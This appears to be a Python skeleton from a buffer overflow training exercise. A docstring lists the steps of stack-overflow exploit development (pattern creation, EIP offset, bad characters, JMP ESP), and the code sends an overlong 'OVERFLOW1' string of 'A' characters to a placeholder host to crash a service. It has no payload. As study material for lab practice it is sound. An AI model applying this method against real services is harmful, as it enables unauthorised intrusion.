#!/usr/bin/python
"""
To start exploitation development process, offsec provided a poc to build and work from, they already identified the initial crash buffer. 

Dev Proces:
    1.)  Test PoC to make sure program crashes
    2.)  Generate random characters with 
                msf-pattern_create -l <number> > rand.txt
    2a.) Run exploit, find the eip register address, this should not 414141 or anything else
    3.)  From the eip number we will find the offset by running:
                msf-pattern_offset -q <EIP>
    4.)  New offset will be used instead of the original number and we will try to control eip by putting "B" or whatever letter you want
                buffer = "A" * <offset> + "B" * 4
    5.)  Once that is confirmed move to identifying bad characters
    6.)  Find jmp esp and test
    7.) final exploit
"""
import socket

RHOST = "<IP>"  #Target IP
RPORT = <PORT> 	   #Target Port


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf = "A" * <number>



s.send("OVERFLOW1 " + buf)
s.recv(1024)
s.close()

